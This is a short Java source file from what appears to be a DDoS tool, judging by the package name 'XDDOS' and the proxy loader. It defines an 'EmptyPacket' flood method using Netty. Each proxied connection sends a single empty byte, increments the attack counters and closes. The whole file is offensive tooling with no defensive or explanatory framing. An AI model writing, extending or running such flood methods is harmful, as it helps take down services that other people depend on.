package XD.XDDOS.methods;

import XD.XDDOS.NettyBootstrap;
import XD.XDDOS.ProxyLoader;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class EmptyPacket implements Method {
  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    channel.writeAndFlush(Unpooled.buffer().writeBytes(new byte[1]));
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
    channel.close();
  }
}
